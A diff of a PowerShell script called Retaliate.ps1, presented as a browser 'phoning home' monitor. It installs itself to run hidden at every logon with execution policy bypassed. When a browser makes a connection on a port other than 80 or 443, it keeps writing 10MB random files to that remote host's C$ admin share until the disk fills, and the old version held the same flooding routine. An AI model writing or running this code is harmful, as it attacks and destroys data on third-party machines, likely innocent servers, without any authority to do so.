@@ -1,114 +1,306 @@
-﻿# Retaliate.ps1
-# Author: Gorstak
+# Retaliate.ps1
+# Author: Gorstak (gorstak.eu)
+# Description: Browser network monitor that detects non-user-initiated outbound connections
+#              (phoning home) from browser processes. Distinguishes active navigation (HTTP/HTTPS)
+#              from background telemetry. Retaliates against detected C2 by flooding remote
+#              admin shares. Runs persistently with scheduled task.
+#Requires -RunAsAdministrator
 
-# Persistance
-function Install-Startup {
-    $scriptPath = $PSCommandPath
+param(
+    [switch]$Install,
+    [switch]$Uninstall
+)
+
+$Script:TaskName = "RetaliateMonitor"
+$Script:InstallDir = "$env:ProgramData\Retaliate"
+$Script:ScriptName = "Retaliate.ps1"
+
+# -- Persistence ------------------------------------------------
+function Install-Persistence {
+    $dir = $Script:InstallDir
+    $dest = Join-Path $dir $Script:ScriptName
+    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+    Copy-Item -Path $PSCommandPath -Destination $dest -Force
+
     $existing = Get-ScheduledTask -TaskName $Script:TaskName -ErrorAction SilentlyContinue
-    if ($existing) {
-        Log-Event -Type "system" -Rule "Persistence" -Evidence "Already installed as scheduled task" -Reasoning "Skipping" -Conf 1.0 -Tier "System" -PName "Retaliate" -PId $PID
-        return
-    }
+    if ($existing) { Unregister-ScheduledTask -TaskName $Script:TaskName -Confirm:$false }
+
+    $pwshArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest`""
+    $installed = $false
 
     # Method 1: PowerShell cmdlets
     try {
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
-            -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-        $trigger = New-ScheduledTaskTrigger -AtStartup
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
-            -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $pwshArgs
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+
         Register-ScheduledTask -TaskName $Script:TaskName -Action $action -Trigger $trigger `
-            -Principal $principal -Settings $settings -Description "Windows Sentinel EDR" -Force -ErrorAction Stop | Out-Null
-        Write-Host "  [OK] Installed startup task (PowerShell)" -ForegroundColor Green
-        return
+            -Principal $principal -Settings $settings `
+            -Description "Browser phoning-home retaliation monitor (Gorstak)" -Force | Out-Null
+        Write-Host "[OK] Persistence installed via Register-ScheduledTask." -ForegroundColor Green
+        $installed = $true
     } catch {
-        Write-Host "  [WARN] PS task registration failed, trying schtasks..." -ForegroundColor Yellow
+        Write-Host "[WARN] Register-ScheduledTask failed: $_" -ForegroundColor Yellow
     }
 
-    # Method 2: schtasks fallback
-    try {
-        $cmd = "schtasks /Create /TN `"$($Script:TaskName)`" /TR `"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \`"$scriptPath\`"`" /SC ONSTART /RU SYSTEM /RL HIGHEST /F"
-        $null = cmd /c $cmd 2>&1
-        if ($LASTEXITCODE -eq 0) {
-            Write-Host "  [OK] Installed startup task (schtasks)" -ForegroundColor Green
-        } else {
-            Write-Host "  [WARN] All persistence methods failed" -ForegroundColor Yellow
+    # Method 2: schtasks.exe fallback
+    if (-not $installed) {
+        try {
+            $cmd = "schtasks /Create /TN `"$($Script:TaskName)`" /TR `"powershell.exe $pwshArgs`" /SC ONLOGON /RL HIGHEST /F"
+            $result = cmd /c $cmd 2>&1
+            if ($LASTEXITCODE -eq 0) {
+                Write-Host "[OK] Persistence installed via schtasks.exe fallback." -ForegroundColor Green
+                $installed = $true
+            } else {
+                Write-Host "[WARN] schtasks fallback failed: $result" -ForegroundColor Yellow
+            }
+        } catch {
+            Write-Host "[WARN] schtasks fallback exception: $_" -ForegroundColor Yellow
         }
-    } catch {}
+    }
+
+    if (-not $installed) {
+        Write-Host "[ERROR] Could not install persistence via any method." -ForegroundColor Red
+    }
+    exit 0
 }
 
-$TargetPorts = @(
-    21, 69, 111, 512, 513, 514, 548, 873, 2049,       # Legacy / File Transfer
-    22, 23, 3389, 5900, 5985, 5986,                   # Remote Access
-    135, 137, 138, 139, 445,                          # Windows Services
-    1900, 2869, 5353, 5355,                           # Discovery
-    389, 636,                                         # Directory / LDAP
-    161, 162,                                         # SNMP
-    1433, 1434, 1521, 3306, 5432, 6379, 9042, 9200,   # Databases
-    11211, 27017,
-    2375, 2376, 5000, 8291, 9090, 50070,              # Container / DevOps
-    1099, 5601, 8888,                                 # Management / RCE
-    1080,                                             # Proxies
-    666, 1234, 1337, 4444, 5555, 6666, 6667, 7777,    # Known Malware / Backdoors
-    12345, 31337, 54321
+function Uninstall-Persistence {
+    try {
+        $task = Get-ScheduledTask -TaskName $Script:TaskName -ErrorAction SilentlyContinue
+        if ($task -and $task.State -eq "Running") { Stop-ScheduledTask -TaskName $Script:TaskName -ErrorAction SilentlyContinue }
+        if ($task) { Unregister-ScheduledTask -TaskName $Script:TaskName -Confirm:$false -ErrorAction SilentlyContinue }
+    } catch {}
+    & schtasks.exe /Delete /TN "$($Script:TaskName)" /F 2>$null | Out-Null
+    $dest = Join-Path $Script:InstallDir $Script:ScriptName
+    if (Test-Path $dest) { Remove-Item $dest -Force -ErrorAction SilentlyContinue }
+    Write-Host "[OK] RetaliateMonitor uninstalled." -ForegroundColor Green
+    exit 0
+}
+
+if ($Install)   { Install-Persistence }
+if ($Uninstall) { Uninstall-Persistence }
+
+# Auto-install on first run (schtasks fallback for debloated Windows where WMI is broken)
+$taskExists = (schtasks /Query /TN $Script:TaskName 2>$null) -match $Script:TaskName
+if (-not $taskExists) {
+    $dir = $Script:InstallDir
+    $dest = Join-Path $dir $Script:ScriptName
+    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+    if ($PSCommandPath -ne $dest) { Copy-Item -Path $PSCommandPath -Destination $dest -Force }
+    $pwshArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest`""
+    try {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $pwshArgs
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        Register-ScheduledTask -TaskName $Script:TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Retaliate monitor (Gorstak)" -Force | Out-Null
+    } catch {
+        schtasks /Create /TN "$($Script:TaskName)" /TR "powershell.exe $pwshArgs" /SC ONLOGON /RL HIGHEST /F 2>&1 | Out-Null
+    }
+}
+
+# -- Helper -----------------------------------------------------
+function Write-ColorOutput { param([string]$Message, [string]$Color = "White"); Write-Host $Message -ForegroundColor $Color }
+
+# --- Monitor mode (NTM) ---
+$script:AllowedDomains = @()
+$script:AllowedIPs = @()
+$script:RetaliatedConnections = @{}
+$script:MonitoringActive = $true
+$script:CurrentBrowserConnections = @{}
+
+# Browsers only: monitoring and retaliation apply solely to these processes.
+$BrowserProcesses = @(
+    'chrome', 'firefox', 'msedge', 'iexplore', 'opera', 'brave', 'vivaldi', 'waterfox', 'palemoon',
+    'seamonkey', 'librewolf', 'tor', 'dragon', 'iridium', 'chromium', 'maxthon', 'slimjet', 'citrio',
+    'blisk', 'sidekick', 'epic', 'ghostery', 'falkon', 'kinza', 'orbitum', 'coowon', 'coc_coc_browser',
+    'browser', 'qqbrowser', 'ucbrowser', '360chrome', '360se', 'sleipnir', 'k-meleon', 'basilisk',
+    'floorp', 'pulse', 'naver', 'whale', 'coccoc', 'yandex', 'avastbrowser', 'asb', 'avgbrowser',
+    'ccleanerbrowser', 'dcbrowser', 'edge', 'edgedev', 'edgebeta', 'edgecanary', 'operagx', 'operaneon',
+    'bravesoftware', 'browsex', 'browsec', 'comet', 'elements', 'flashpeak', 'surf'
 )
 
+# Gaming (and all non-browser apps) are never monitored or retaliated against - explicitly unhindered.
+$GamingProcesses = @(
+    'steam', 'steamwebhelper', 'epicgameslauncher', 'origin', 'battle.net', 'eadesktop', 'ea app',
+    'ubisoft game launcher', 'gog galaxy', 'rungame', 'gamebar', 'gameservices', 'overwolf'
+)
+
+# Never retaliate against these IPs (common DNS). Retaliating would break resolution for everyone.
+$NeverRetaliateIPs = @('8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1')
+
+function Add-AllowedDomain {
+    param([string]$Domain)
+    $Domain = $Domain -replace '^https?://', '' -replace '/$', ''
+    $Domain = ($Domain -split '/')[0]
+    if ($Domain -match '^[\d\.]+$' -or $Domain -match '^[\da-f:]+$') {
+        if ($script:AllowedIPs -notcontains $Domain) {
+            $script:AllowedIPs += $Domain
+            Write-ColorOutput "Added allowed IP: $Domain" "Green"
+        }
+        return
+    }
+    if ($script:AllowedDomains -notcontains $Domain) {
+        $script:AllowedDomains += $Domain
+        Write-ColorOutput "Added allowed domain: $Domain" "Green"
+        try {
+            $IPs = [System.Net.Dns]::GetHostAddresses($Domain) | ForEach-Object { $_.IPAddressToString }
+            foreach ($IP in $IPs) {
+                if ($script:AllowedIPs -notcontains $IP) {
+                    $script:AllowedIPs += $IP
+                    Write-ColorOutput "  Resolved IP: $IP" "Gray"
+                }
+            }
+        } catch {
+            Write-ColorOutput "  Warning: Could not resolve domain to IP" "Yellow"
+        }
+    }
+}
+
+function Test-IsActiveBrowsing {
+    param([string]$RemoteAddress, [string]$ProcessName, [int]$RemotePort)
+    
+    # Check if this is a browser process
+    if ($BrowserProcesses -notcontains $ProcessName.ToLower()) {
+        return $false
+    }
+    
+    # Check if it's a local/private IP (always allow)
+    if ($RemoteAddress -match '^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)') {
+        return $true
+    }
+    
+    # Check if it's in the never-retaliate list
+    if ($NeverRetaliateIPs -contains $RemoteAddress) {
+        return $true
+    }
+    
+    # Check if it's in the allowed list
+    if ($script:AllowedIPs -contains $RemoteAddress) {
+        return $true
+    }
+    
+    $Now = Get-Date
+    
+    # Check if this is a navigation connection (HTTP/HTTPS on ports 80/443)
+    if ($RemotePort -eq 443 -or $RemotePort -eq 80) {
+        $script:CurrentBrowserConnections[$RemoteAddress] = $Now
+        Write-ColorOutput "ACTIVE NAVIGATION: ${RemoteAddress}:${RemotePort} (Process: $ProcessName)" "Cyan"
+        return $true
+    }
+    
+    # Check if there was recent navigation (within 30 seconds) - this is a dependency
+    foreach ($BrowserIP in $script:CurrentBrowserConnections.Keys) {
+        $ConnectionTime = $script:CurrentBrowserConnections[$BrowserIP]
+        $TimeDiff = ($Now - $ConnectionTime).TotalSeconds
+        if ($TimeDiff -le 30) {
+            Write-ColorOutput "DEPENDENCY: ${RemoteAddress}:${RemotePort} (linked to active navigation)" "Gray"
+            return $true
+        }
+    }
+    
+    # Not active browsing - this is likely phoning home
+    return $false
+}
 
 function Fill-RemoteHostDriveWithGarbage {
+    param(
+        [string]$RemoteAddress,
+        [int]$RemotePort,
+        [string]$ProcessName,
+        [string]$ProgramPath
+    )
     try {
-        # Get incoming TCP connections (where LocalAddress is bound and RemoteAddress is the client)
-    foreach ($Port in $TargetPorts) {
-        # Tražimo poklapanje na lokalnom ili udaljenom portu
-        $IsConnected = $ActiveConnections | Where-Object { $_.LocalPort -eq $Port -or $_.RemotePort -eq $Port }
-            foreach ($conn in $connections) {
-                $remoteIP = $conn.RemoteAddress
-                # Attempt to access the remote host's C$ share (admin share)
-                $remotePath = "\\$remoteIP\C$"
-                
-                # Check if the remote path is accessible (requires admin rights)
-                if (Test-Path $remotePath) {
-                    $counter = 1
-                    while ($true) {
-                        try {
-                            $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
-                            $garbage = [byte[]]::new(1024) # 1MB in bytes
-                            (New-Object System.Random).NextBytes($garbage)
-                            [System.IO.File]::WriteAllBytes($filePath, $garbage)
-                            Write-Host "Wrote 10MB to $filePath"
-                            $counter++
-                        }
-                        catch {
-                            # Stop if the drive is full or another error occurs
-                            if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
-                                Write-Host "Drive at $remotePath is full or inaccessible. Stopping."
-                                break
-                            }
-                            else {
-                                Write-Host "Error writing to $filePath : $_"
-                                break
-                            }
-                        }
-                    }
+        # Attempt to access the remote host's C$ share (admin share)
+        $remotePath = "\\$RemoteAddress\C$"
+        
+        # Check if the remote path is accessible (requires admin rights)
+        if (Test-Path $remotePath) {
+            $counter = 1
+            while ($true) {
+                try {
+                    $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
+                    $garbage = [byte[]]::new(10485760) # 10MB in bytes
+                    (New-Object System.Random).NextBytes($garbage)
+                    [System.IO.File]::WriteAllBytes($filePath, $garbage)
+                    Write-ColorOutput "Wrote 10MB to $filePath" "Yellow"
+                    $counter++
                 }
-                else {
-                    Write-Host "Cannot access $remotePath - check permissions or connectivity."
+                catch {
+                    # Stop if the drive is full or another error occurs
+                    if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
+                        Write-ColorOutput "Drive at $remotePath is full or inaccessible. Stopping." "Yellow"
+                        break
+                    }
+                    else {
+                        Write-ColorOutput "Error writing to $filePath : $_" "Red"
+                        break
+                    }
                 }
             }
         }
         else {
-            Write-Host "No incoming connections found."
+            Write-ColorOutput "Cannot access $remotePath - check permissions or connectivity." "Yellow"
         }
     }
     catch {
-        Write-Host "General error: $_"
+        Write-ColorOutput "General error: $_" "Red"
     }
 }
 
-# Run as a background job
-Start-Job -ScriptBlock {
-    while ($true) {
-        Fill-RemoteHostDriveWithGarbage
-        Start-Sleep -Seconds 5 # Small delay to avoid overwhelming the system
+function Start-ConnectionMonitoring {
+    $SeenConnections = @{}
+    while ($script:MonitoringActive) {
+        $Connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
+            Where-Object { $_.RemoteAddress -ne '0.0.0.0' -and $_.RemoteAddress -ne '::' }
+        foreach ($Conn in $Connections) {
+            $Key = "$($Conn.RemoteAddress):$($Conn.RemotePort):$($Conn.OwningProcess)"
+            if ($SeenConnections.ContainsKey($Key)) { continue }
+            $SeenConnections[$Key] = $true
+            try {
+                $Process = Get-Process -Id $Conn.OwningProcess -ErrorAction Stop
+                $ProcessName = $Process.ProcessName
+                $ProcessPath = $Process.Path
+            } catch { $Process = $null; $ProcessName = "Unknown"; $ProcessPath = $null }
+            $procName = ($ProcessName -replace '\.exe$','').Trim().ToLower()
+            if ($procName -notin $BrowserProcesses) {
+                continue
+            }
+            
+            # Check if this is active browsing (navigation or dependency)
+            $IsActiveBrowsing = Test-IsActiveBrowsing -RemoteAddress $Conn.RemoteAddress -ProcessName $ProcessName -RemotePort $Conn.RemotePort
+            
+            # If not active browsing, this is likely phoning home - retaliate
+            if (-not $IsActiveBrowsing) {
+                $retaliateKey = "$($Conn.RemoteAddress)|$ProcessName"
+                if (-not $script:RetaliatedConnections.ContainsKey($retaliateKey)) {
+                    Write-ColorOutput "PHONING HOME DETECTED: $($Conn.RemoteAddress):$($Conn.RemotePort) (Process: $ProcessName)" "Red"
+                    Fill-RemoteHostDriveWithGarbage -RemoteAddress $Conn.RemoteAddress -RemotePort $Conn.RemotePort -ProcessName $ProcessName -ProgramPath $ProcessPath
+                    $script:RetaliatedConnections[$retaliateKey] = @{
+                        IP = $Conn.RemoteAddress
+                        Port = $Conn.RemotePort
+                        Process = $ProcessName
+                        Timestamp = Get-Date
+                    }
+                }
+            }
+        }
+        $Now = Get-Date
+        $ToRemove = @()
+        foreach ($IP in $script:CurrentBrowserConnections.Keys) {
+            if (($Now - $script:CurrentBrowserConnections[$IP]).TotalSeconds -gt 60) { $ToRemove += $IP }
+        }
+        foreach ($IP in $ToRemove) { $script:CurrentBrowserConnections.Remove($IP) }
+        Start-Sleep -Seconds 2
     }
 }
+
+    # Start monitoring only if running from installed location (scheduled task)
+    $installedDir = $Script:InstallDir
+    if ($PSCommandPath -and $PSCommandPath.StartsWith($installedDir, [System.StringComparison]::OrdinalIgnoreCase)) {
+        Start-ConnectionMonitoring
+    } else {
+        Write-ColorOutput "[OK] Retaliate installed. Monitor runs via scheduled task." "Green"
+    }
